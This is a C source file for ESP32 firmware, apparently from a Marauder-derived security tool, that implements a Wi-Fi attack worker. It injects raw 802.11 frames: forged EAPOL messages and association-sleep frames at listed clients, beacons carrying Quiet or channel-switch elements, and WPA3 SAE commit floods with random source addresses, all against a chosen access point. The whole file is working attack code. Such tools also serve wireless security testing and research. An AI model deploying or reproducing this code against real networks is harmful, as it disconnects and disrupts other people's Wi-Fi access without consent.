// SPDX-License-Identifier: MIT
// Copyright (c) 2026 THE POOM
// Protocol formats: ESP32 Marauder, Copyright (c) 2020 Just Call Me Koko.
// See MARAUDER_LICENSE.txt. Native IDF lifecycle and PSA crypto are POOM code.
#include "poom_wifi_marauder.h"
#include "poom_marauder_frames.h"
#include "poom_wifi_ctrl.h"

#include <stdlib.h>
#include <string.h>
#include "esp_random.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"
#include "freertos/task.h"
#include "psa/crypto.h"

static portMUX_TYPE s_lock = portMUX_INITIALIZER_UNLOCKED;
static SemaphoreHandle_t s_control;
static bool s_busy;
static bool s_stop_requested;
static int64_t s_start_us;
static poom_marauder_status_t s_status;

/* API callers serialize initialization and synchronous stop. The worker never
 * takes this mutex, so cleanup cannot deadlock a caller waiting for its exit. */
static SemaphoreHandle_t control_mutex(void)
{
    taskENTER_CRITICAL(&s_lock);
    SemaphoreHandle_t result = s_control;
    taskEXIT_CRITICAL(&s_lock);
    if (result != NULL) return result;
    SemaphoreHandle_t candidate = xSemaphoreCreateMutex();
    if (candidate == NULL) return NULL;
    taskENTER_CRITICAL(&s_lock);
    if (s_control == NULL) {
        s_control = candidate;
        candidate = NULL;
    }
    result = s_control;
    taskEXIT_CRITICAL(&s_lock);
    if (candidate != NULL) vSemaphoreDelete(candidate);
    return result;
}

static bool stop_requested(void)
{
    taskENTER_CRITICAL(&s_lock);
    bool stop = s_stop_requested;
    taskEXIT_CRITICAL(&s_lock);
    return stop;
}

static uint32_t elapsed_ms(void)
{
    return (uint32_t)((esp_timer_get_time() - s_start_us) / 1000);
}

static void record_error(esp_err_t error)
{
    taskENTER_CRITICAL(&s_lock);
    ++s_status.errors;
    s_status.last_error = error;
    taskEXIT_CRITICAL(&s_lock);
}

static bool unicast_mac(const uint8_t mac[6])
{
    static const uint8_t zero[6] = {0};
    return (mac[0] & 1U) == 0 && memcmp(mac, zero, sizeof(zero)) != 0;
}

static bool personal_sae(wifi_auth_mode_t auth)
{
    return auth == WIFI_AUTH_WPA3_PSK || auth == WIFI_AUTH_WPA2_WPA3_PSK;
}

static bool modern_key_descriptor(wifi_auth_mode_t auth)
{
    return personal_sae(auth) || auth == WIFI_AUTH_WPA3_ENTERPRISE ||
           auth == WIFI_AUTH_WPA2_WPA3_ENTERPRISE || auth == WIFI_AUTH_WPA3_ENT_192 ||
           auth == WIFI_AUTH_WAPI_PSK;
}

static esp_err_t normalize_config(poom_marauder_config_t *config)
{
    if (config->mode < POOM_MARAUDER_BAD_MSG || config->mode > POOM_MARAUDER_SAE_COMMIT ||
        !unicast_mac(config->ap.bssid) ||
        !poom_wifi_ctrl_channel_is_valid(config->ap.primary) ||
        config->client_count > POOM_MARAUDER_MAX_CLIENTS) return ESP_ERR_INVALID_ARG;
    if (config->duration_ms == 0) config->duration_ms = POOM_MARAUDER_DEFAULT_DURATION_MS;
    if (config->interval_ms == 0) config->interval_ms = POOM_MARAUDER_DEFAULT_INTERVAL_MS;
    if (config->duration_ms > POOM_MARAUDER_MAX_DURATION_MS ||
        config->interval_ms < POOM_MARAUDER_DEFAULT_INTERVAL_MS || config->interval_ms > 5000U)
        return ESP_ERR_INVALID_ARG;
    if (config->mode == POOM_MARAUDER_BAD_MSG || config->mode == POOM_MARAUDER_ASSOC_SLEEP) {
        if (config->client_count == 0) return ESP_ERR_INVALID_ARG;
        for (size_t i = 0; i < config->client_count; ++i) {
            if (!unicast_mac(config->clients[i]) || memcmp(config->clients[i], config->ap.bssid, 6) == 0)
                return ESP_ERR_INVALID_ARG;
            for (size_t j = 0; j < i; ++j)
                if (memcmp(config->clients[i], config->clients[j], 6) == 0) return ESP_ERR_INVALID_ARG;
        }
    }
    if (config->mode == POOM_MARAUDER_SAE_COMMIT && !personal_sae(config->ap.authmode))
        return ESP_ERR_NOT_SUPPORTED;
    if (config->mode == POOM_MARAUDER_CSA) {
        if (config->csa_channel == 0)
            config->csa_channel = config->ap.primary > 14 ? (config->ap.primary == 36 ? 40 : 36) : (config->ap.primary == 1 ? 6 : 1);
        if (!poom_wifi_ctrl_channel_is_valid(config->csa_channel) ||
            config->csa_channel == config->ap.primary ||
            (config->csa_channel > 14) != (config->ap.primary > 14)) return ESP_ERR_INVALID_ARG;
    }
    return ESP_OK;
}

static esp_err_t crypto_error(psa_status_t error)
{
    if (error == PSA_SUCCESS) return ESP_OK;
    if (error == PSA_ERROR_NOT_SUPPORTED) return ESP_ERR_NOT_SUPPORTED;
    if (error == PSA_ERROR_INSUFFICIENT_MEMORY) return ESP_ERR_NO_MEM;
    return ESP_FAIL;
}

/* PSA supplies a fresh group-19 scalar and its valid P-256 point without using
 * private mbedTLS structures removed in IDF 6 / mbedTLS 4. The temporary key
 * exists only for this frame and is destroyed on every exit path. */
static esp_err_t sae_material(uint8_t scalar[32], uint8_t point[64])
{
    psa_key_attributes_t attributes = PSA_KEY_ATTRIBUTES_INIT;
    psa_key_id_t key = 0;
    uint8_t encoded_point[65];
    size_t scalar_length = 0, point_length = 0;
    psa_set_key_type(&attributes, PSA_KEY_TYPE_ECC_KEY_PAIR(PSA_ECC_FAMILY_SECP_R1));
    psa_set_key_bits(&attributes, 256);
    psa_set_key_usage_flags(&attributes, PSA_KEY_USAGE_EXPORT);
    psa_status_t error = psa_generate_key(&attributes, &key);
    psa_reset_key_attributes(&attributes);
    if (error == PSA_SUCCESS) error = psa_export_key(key, scalar, 32, &scalar_length);
    if (error == PSA_SUCCESS) error = psa_export_public_key(key, encoded_point, sizeof(encoded_point), &point_length);
    if (key != 0) {
        psa_status_t cleanup_error = psa_destroy_key(key);
        if (error == PSA_SUCCESS) error = cleanup_error;
    }
    if (error != PSA_SUCCESS) return crypto_error(error);
    if (scalar_length != 32 || point_length != 65 || encoded_point[0] != 4) return ESP_ERR_INVALID_SIZE;
    memcpy(point, encoded_point + 1, 64);
    return ESP_OK;
}

static void attack_worker(void *argument)
{
    const poom_marauder_config_t config = *(poom_marauder_config_t *)argument;
    free(argument);
    poom_marauder_frame_target_t ap = {0};
    memcpy(ap.bssid, config.ap.bssid, 6);
    ap.ssid_len = strnlen((const char *)config.ap.ssid, sizeof(ap.ssid));
    memcpy(ap.ssid, config.ap.ssid, ap.ssid_len);
    ap.channel = config.ap.primary;
    ap.privacy = config.ap.authmode != WIFI_AUTH_OPEN;
    ap.wpa3 = modern_key_descriptor(config.ap.authmode);
    uint16_t sequence = 0;
    uint64_t replay = 1;
    size_t client_index = 0;
    uint8_t frame[POOM_MARAUDER_FRAME_CAPACITY];

    while (!stop_requested() && elapsed_ms() < config.duration_ms) {
        size_t length = 0;
        esp_err_t error = ESP_OK;
        if (config.mode == POOM_MARAUDER_BAD_MSG) {
            uint8_t nonce[32];
            esp_fill_random(nonce, sizeof(nonce));
            length = poom_marauder_frame_bad_msg(frame, sizeof(frame), &ap,
                config.clients[client_index], sequence++, replay++, nonce);
        } else if (config.mode == POOM_MARAUDER_ASSOC_SLEEP) {
            length = poom_marauder_frame_assoc_sleep(frame, sizeof(frame), &ap,
                config.clients[client_index], sequence++);
        } else if (config.mode == POOM_MARAUDER_QUIET || config.mode == POOM_MARAUDER_CSA) {
            length = poom_marauder_frame_beacon(frame, sizeof(frame), &ap,
                sequence++, (uint64_t)esp_timer_get_time(), config.mode == POOM_MARAUDER_QUIET,
                config.csa_channel);
        } else {
            uint8_t scalar[32], point[64], source[6];
            error = sae_material(scalar, point);
            if (error == ESP_OK) {
                esp_fill_random(source, sizeof(source));
                source[0] = (source[0] & 0xfeU) | 0x02U;
                length = poom_marauder_frame_sae(frame, sizeof(frame), &ap,
                    source, sequence++, scalar, point);
            }
            memset(scalar, 0, sizeof(scalar));
        }
        if (error == ESP_OK && length == 0) error = ESP_ERR_INVALID_SIZE;
        if (error != ESP_OK) { record_error(error); break; }
        if (stop_requested() || elapsed_ms() >= config.duration_ms) break;
        error = esp_wifi_80211_tx(WIFI_IF_STA, frame, (int)length, false);
        taskENTER_CRITICAL(&s_lock);
        ++s_status.attempted;
        if (error == ESP_OK) ++s_status.sent;
        taskEXIT_CRITICAL(&s_lock);
        if (error != ESP_OK) { record_error(error); break; }
        if (config.client_count != 0) client_index = (client_index + 1U) % config.client_count;

        const int64_t next_us = esp_timer_get_time() + (int64_t)config.interval_ms * 1000;
        while (!stop_requested() && elapsed_ms() < config.duration_ms && esp_timer_get_time() < next_us)
            vTaskDelay(pdMS_TO_TICKS(10) > 0 ? pdMS_TO_TICKS(10) : 1);
    }
    /* Signal completion only after radio cleanup; a subsequent scanner can
     * safely claim the driver when stop() returns or running becomes false. */
    esp_err_t cleanup_error = poom_wifi_ctrl_set_promiscuous(false);
    if (cleanup_error != ESP_OK) record_error(cleanup_error);
    cleanup_error = poom_wifi_ctrl_deinit();
    if (cleanup_error != ESP_OK) record_error(cleanup_error);
    const uint32_t duration = elapsed_ms();
    taskENTER_CRITICAL(&s_lock);
    s_status.elapsed_ms = duration;
    s_status.running = false;
    s_busy = false;
    taskEXIT_CRITICAL(&s_lock);
    vTaskDelete(NULL);
}

esp_err_t poom_wifi_marauder_start(const poom_marauder_config_t *input)
{
    if (input == NULL) return ESP_ERR_INVALID_ARG;
    poom_marauder_config_t config = *input;
    esp_err_t error = normalize_config(&config);
    if (error != ESP_OK) return error;
    SemaphoreHandle_t mutex = control_mutex();
    if (mutex == NULL) return ESP_ERR_NO_MEM;
    xSemaphoreTake(mutex, portMAX_DELAY);
    taskENTER_CRITICAL(&s_lock);
    bool busy = s_busy;
    taskEXIT_CRITICAL(&s_lock);
    if (busy) { xSemaphoreGive(mutex); return ESP_ERR_INVALID_STATE; }

    poom_marauder_config_t *argument = malloc(sizeof(*argument));
    if (argument == NULL) { xSemaphoreGive(mutex); return ESP_ERR_NO_MEM; }
    *argument = config;
    taskENTER_CRITICAL(&s_lock);
    memset(&s_status, 0, sizeof(s_status));
    s_status.mode = config.mode;
    s_stop_requested = false;
    taskEXIT_CRITICAL(&s_lock);
    if (config.mode == POOM_MARAUDER_SAE_COMMIT) error = crypto_error(psa_crypto_init());
    bool radio_attempted = false;
    if (error == ESP_OK) { radio_attempted = true; error = poom_wifi_ctrl_init_sta(); }
    if (error == ESP_OK) error = poom_wifi_ctrl_set_channel(config.ap.primary);
    if (error == ESP_OK) error = esp_wifi_set_ps(WIFI_PS_NONE);
    if (error == ESP_OK) error = poom_wifi_ctrl_set_promiscuous(true);
    if (error == ESP_OK) {
        taskENTER_CRITICAL(&s_lock);
        s_start_us = esp_timer_get_time();
        s_busy = true;
        s_status.running = true;
        taskEXIT_CRITICAL(&s_lock);
        if (xTaskCreate(attack_worker, "beast_marauder", 8192, argument, 5, NULL) != pdPASS)
            error = ESP_ERR_NO_MEM;
    }
    if (error != ESP_OK) {
        free(argument);
        if (radio_attempted) {
            (void)poom_wifi_ctrl_set_promiscuous(false);
            (void)poom_wifi_ctrl_deinit();
        }
        record_error(error);
        taskENTER_CRITICAL(&s_lock);
        s_busy = false;
        s_status.running = false;
        taskEXIT_CRITICAL(&s_lock);
    }
    xSemaphoreGive(mutex);
    return error;
}

void poom_wifi_marauder_stop(void)
{
    SemaphoreHandle_t mutex = control_mutex();
    if (mutex == NULL) return; /* No successful start can precede mutex creation. */
    xSemaphoreTake(mutex, portMAX_DELAY);
    taskENTER_CRITICAL(&s_lock);
    s_stop_requested = true;
    bool busy = s_busy;
    taskEXIT_CRITICAL(&s_lock);
    while (busy) {
        vTaskDelay(pdMS_TO_TICKS(10) > 0 ? pdMS_TO_TICKS(10) : 1);
        taskENTER_CRITICAL(&s_lock);
        busy = s_busy;
        taskEXIT_CRITICAL(&s_lock);
    }
    xSemaphoreGive(mutex);
}

void poom_wifi_marauder_get_status(poom_marauder_status_t *status)
{
    if (status == NULL) return;
    taskENTER_CRITICAL(&s_lock);
    *status = s_status;
    const int64_t started = s_start_us;
    taskEXIT_CRITICAL(&s_lock);
    if (status->running) status->elapsed_ms = (uint32_t)((esp_timer_get_time() - started) / 1000);
}
